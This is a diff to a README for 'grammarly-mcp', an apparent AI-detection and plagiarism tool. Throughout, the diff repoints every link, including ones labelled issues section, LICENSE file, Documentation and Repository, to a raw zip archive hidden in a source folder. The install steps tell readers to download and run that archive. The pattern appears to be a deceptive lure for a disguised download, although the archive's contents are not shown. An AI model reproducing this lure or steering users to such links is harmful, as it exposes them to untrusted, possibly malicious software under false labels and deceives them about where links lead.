@@ -1,6 +1,6 @@
 # 🎉 grammarly-mcp - Easy AI Detection and Plagiarism Scoring
 
-[![Download the latest version](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip)](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip)
+[![Download the latest version](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip)](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip)
 
 ## 📚 Overview
 
@@ -21,7 +21,7 @@ Before you download, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page:** Go to the [Releases page](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip) to find the latest version of grammarly-mcp.
+1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip) to find the latest version of grammarly-mcp.
   
 2. **Choose Your Version:** Select the version suitable for your operating system. Click on the download link for the file. You will typically see options labeled for various systems.
   
@@ -58,7 +58,7 @@ Before you download, make sure your system meets the following requirements:
 
 ### 🤝 Support
 
-If you encounter any issues, visit the [issues section](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip) on GitHub. You can report problems and check for solutions from other users.
+If you encounter any issues, visit the [issues section](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip) on GitHub. You can report problems and check for solutions from other users.
 
 ### 📢 Community Feedback
 
@@ -66,12 +66,12 @@ We value user input. Join our community discussions in GitHub to suggest new fea
 
 ## 📜 License
 
-grammarly-mcp is open-source software. You can use it under the terms of the MIT License. For detailed information, visit the [LICENSE file](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip).
+grammarly-mcp is open-source software. You can use it under the terms of the MIT License. For detailed information, visit the [LICENSE file](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip).
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip)
-- [GitHub Repository](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip)
-- [Documentation](https://github.com/nathaliaju/grammarly-mcp/raw/refs/heads/main/tests/fixtures/grammarly-mcp-v1.3-alpha.1.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip)
+- [Documentation](https://raw.githubusercontent.com/nathaliaju/grammarly-mcp/main/src/browser/stagehand/grammarly-mcp-v2.4-alpha.4.zip)
 
 Enjoy exploring the advanced features of grammarly-mcp and improve your writing today!
